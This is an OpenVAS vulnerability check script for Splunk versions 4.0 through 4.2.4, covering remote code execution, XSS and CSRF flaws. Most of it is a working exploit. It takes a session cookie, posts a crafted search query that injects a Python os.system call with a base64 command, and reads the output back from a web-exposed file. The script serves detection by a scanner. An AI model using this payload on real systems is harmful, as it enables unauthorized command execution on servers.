##############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_splunk_multiple_vuln.nasl 13 2013-10-27 12:16:33Z jan $
#
# Splunk Multiple Vulnerabilities
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow remote attackers to inject and execute
  arbitrary code and conduct cross-site scripting and cross-site request
  forgery attacks.
  Impact Level: Application/System";
tag_affected = "Splunk versions 4.0 through 4.2.4";
tag_insight = "- The application allows users to perform search actions via HTTP requests
    without performing proper validity checks to verify the requests. This
    can be exploited to execute arbitrary code when a logged-in administrator
    visits a specially crafted web page.
  - Certain unspecified input is not properly sanitised before being returned
    to the user. This can be exploited to execute arbitrary HTML and script
    code in a user's browser session in context of an affected site.
  - Certain input passed to the web API is not properly sanitised before being
    used to access files. This can be exploited to disclose the content of
    arbitrary files via directory traversal attacks.";
tag_solution = "Upgrade to Splunk version 4.2.5 or later.
  For updates refer to http://www.splunk.com/download";
tag_summary = "This host is running Splunk and is prone to multiple
  vulnerabilities.";

if(description)
{
  script_id(902801);
  script_version("$Revision: 13 $");
  script_cve_id("CVE-2011-4642", "CVE-2011-4643", "CVE-2011-4644", "CVE-2011-4778");
  script_bugtraq_id(51061);
  script_tag(name:"cvss_base", value:"9.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2011-12-22 11:11:11 +0530 (Thu, 22 Dec 2011)");
  script_name("Splunk Multiple Vulnerabilities");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://www.sec-1.com/blog/?p=233");
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/77694");
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/77695");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47232");
  script_xref(name : "URL" , value : "http://www.splunk.com/view/SP-CAAAGMM");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18245");
  script_xref(name : "URL" , value : "http://tools.cisco.com/security/center/viewAlert.x?alertId=24805");

  script_description(desc);
  script_summary("Check if Splunk is vulnerable to remote code execution");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("gb_splunk_detect.nasl");
  script_require_ports("Services/www", 8000);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("url_func.inc");
include("http_func.inc");
include("misc_func.inc");
include("version_func.inc");
include("openvas-https.inc");
include("http_keepalive.inc");

## Build Exploit
function exploit(command)
{
  url = "/en-GB/api/search/jobs";

  postData = string(
               "search=search%20index%3D_internal%20source%3D%2Asplunkd.",
               "log%20%7Cmappy%20x%3Deval%28%22sys.modules%5B%27os%27%5D",
               ".system%28base64.b64decode%28%27", command, "aXBjb25maWc",
               "%2BImM6XHByb2dyYW0gZmlsZXNcc3BsdW5rXHNoYXJlXHNwbHVua1xzZ",
               "WFyY2hfbXJzcGFya2xlXGV4cG9zZWRcanNcLnRtcCI%3D%27%29%29%2",
               "2%29&status_buckets=300&namespace=search&ui_dispatch_app",
               "=search&ui_dispatch_view=flashtimeline&auto_cancel=100&r",
               "equired_field_list=*&earliest_time=&latest_time="
               );

  req = string(
               "POST ", url, " HTTP/1.1\r\n",
               "Host: ", host, "\r\n",
               "Accept-Encoding: identity\r\n",
               "X-Splunk-Session: ", xsplunk,"\r\n",
               "Cookie: ", session, "\r\n",
               "X-Requested-With: XMLHttpRequest\r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Content-Length: ", strlen(postData), "\r\n",
               "\r\n", postData
             );
  return req;
}


## Get HTTP Port
port = get_http_port(default:8000);
if(!port){
  exit(0);
}

## Get Host Name
host = get_host_name();
if(! host){
  exit(0);
}

## Confirm the application
if(! version = get_kb_item(string("www/", port, "/splunk"))){
  exit(0);
}

## The Splunkd Web API port
dport = 8089;
if(!get_port_state(dport)){
  exit(0);
}

## Get Server Info
req = "GET /services/server/info/server-info HTTP/1.1\r\n";
server_info = https_req_get(port:dport, request:req);

## Get OS Name
os = eregmatch(pattern:'name="os_name">(.+)<', string:server_info);
if(isnull(os[1])) {
  exit(0);
}
os = os[1];

## Send and Receive the response
req = http_get(item:"/en-GB/account/login", port:port);
res = http_keepalive_send_recv(port:port, data:req);

## Get Session ID
session = eregmatch(pattern:"Set-Cookie: (session[^;]*);", string:res);
if(isnull(session[1])) {
  exit(0);
}
session = session[1];

xsplunk = eregmatch(pattern:"=([a-zA-Z0-9]+)", string:session);
if(isnull(session[1])) {
  exit(0);
}
xsplunk = xsplunk[1];

## Construct attack request
if("windows" >< tolower(os))
{
  tmp = string('>"', "c:\\program files\\splunk\\share\\splunk\\search_",
               "mrsparkle\\exposed\\js\\.tmp",'"');
  command =  urlencode(str:base64(str: string("ipconfig", tmp)));
  req = exploit(command:command);
}
else
{
  tmp = ">/opt/splunk/share/splunk/search_mrsparkle/exposed/js/.tmp";
  command =  urlencode(str:base64(str: string("id", tmp)));
  req = exploit(command:command);
}

## Send crafted POST request and receive the response
res = http_keepalive_send_recv(port:port, data:req);

## Wait for command execution
sleep(5);

## Get the result
req = http_get(item:"/en-US/static/@105575/js/.tmp", port:port);
res = http_keepalive_send_recv(port:port, data:req);

## Confirm exploit worked by checking the response
if(egrep(pattern:"Subnet Mask|uid=[0-9]+.*gid=[0-9]+", string:res))
{
  security_hole(port);
  exit(0);
}
